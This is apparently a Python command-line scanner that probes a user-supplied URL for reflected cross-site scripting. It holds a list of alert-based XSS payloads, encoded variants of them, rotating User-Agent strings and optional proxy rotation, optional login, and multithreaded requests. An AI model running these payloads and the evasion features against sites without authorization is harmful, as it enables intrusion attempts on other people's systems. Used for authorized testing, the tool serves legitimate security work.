import requests
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import random
from bs4 import BeautifulSoup
from art import text2art

# Function to display ASCII art
def display_ascii_art():
    art_text = text2art("XSS SCAN", font='block')
    print(art_text)

# Configure logging
logging.basicConfig(filename='xss_test_results.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# List of default XSS payloads to test
default_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\");'></iframe>",
    "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">"
]

# List of User-Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1'
]

# Proxy list (example format: "http://proxyip:port")
proxies = [
    # 'http://proxy1:port',
    # 'http://proxy2:port',
    # Add more proxies here
]

# Dynamic payload creation function
def create_dynamic_payloads(base_payload):
    return [
        base_payload,
        base_payload.replace("<", "%3C").replace(">", "%3E"),
        base_payload.replace("<", "&lt;").replace(">", "&gt;"),
    ]

# Function to test for XSS
def test_xss(base_url, payload, params, session=None):
    try:
        encoded_payload = urllib.parse.quote(payload)
        params['q'] = payload
        encoded_params = urllib.parse.urlencode(params)
        target_url = f"{base_url}?{encoded_params}"

        # Randomly choose a User-Agent and proxy
        headers = {'User-Agent': random.choice(user_agents)}
        proxy = {'http': random.choice(proxies)} if proxies else None

        # Use session if provided
        if session:
            response = session.get(target_url, headers=headers, proxies=proxy)
        else:
            response = requests.get(target_url, headers=headers, proxies=proxy)
        
        response.raise_for_status()  # Check if the request was successful

        if payload in response.text:
            result = f"[!] Potential XSS vulnerability detected with payload: {payload}"
            print(result)
            logging.info(result)
        else:
            # Perform more advanced HTML parsing to detect XSS
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find(text=payload):
                result = f"[!] Potential XSS vulnerability detected with payload (advanced detection): {payload}"
                print(result)
                logging.info(result)
            else:
                result = f"[-] No XSS vulnerability detected with payload: {payload}"
                print(result)
                logging.info(result)

    except requests.RequestException as e:
        error_msg = f"[ERROR] Error testing payload {payload}: {e}"
        print(error_msg)
        logging.error(error_msg)

# Main function to drive the XSS testing
def main():
    # Display ASCII art
    display_ascii_art()
    
    # Get the target URL from the user
    base_url = input("Enter the base URL to test (e.g., http://example.com/search): ")

    # Validate URL format
    if not (base_url.startswith('http://') or base_url.startswith('https://')):
        print("[ERROR] Invalid URL. Please include 'http://' or 'https://'")
        return

    # Get additional parameters from the user
    additional_params = input("Enter any additional query parameters as key=value (comma-separated, e.g., lang=en&user=test): ")
    params = {}
    if additional_params:
        for param in additional_params.split('&'):
            key, value = param.split('=')
            params[key] = value

    # Ask the user if they want to use the default payloads or provide their own
    custom_payloads_input = input("Do you want to provide custom XSS payloads? (yes/no): ").strip().lower()
    if custom_payloads_input == 'yes':
        custom_payloads = input("Enter custom XSS payloads separated by commas: ").strip().split(',')
        payloads = [payload.strip() for payload in custom_payloads]
    else:
        payloads = default_payloads

    # Generate dynamic payloads
    all_payloads = []
    for payload in payloads:
        all_payloads.extend(create_dynamic_payloads(payload))

    # User confirmation before starting the test
    confirmation = input(f"You are about to test for XSS vulnerabilities on {base_url}. Do you want to continue? (yes/no): ").strip().lower()
    if confirmation != 'yes':
        print("Aborted by user.")
        return

    # Option for authenticated testing
    authenticated = input("Do you need to perform authenticated testing? (yes/no): ").strip().lower()
    session = None
    if authenticated == 'yes':
        session = requests.Session()
        login_url = input("Enter the login URL: ")
        login_data = {}
        login_fields = input("Enter login fields as key=value (comma-separated, e.g., username=admin&password=admin): ").strip().split('&')
        for field in login_fields:
            key, value = field.split('=')
            login_data[key] = value
        session.post(login_url, data=login_data)

    # Log start time
    start_time = time.time()

    # Use ThreadPoolExecutor for multithreading
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_xss, base_url, payload, params, session) for payload in all_payloads]
        for future in as_completed(futures):
            future.result()

    # Log end time
    end_time = time.time()

    # Print summary
    print(f"\nTesting completed in {end_time - start_time:.2f} seconds.")
    print(f"Results have been logged to xss_test_results.log.")

if __name__ == "__main__":
    main()
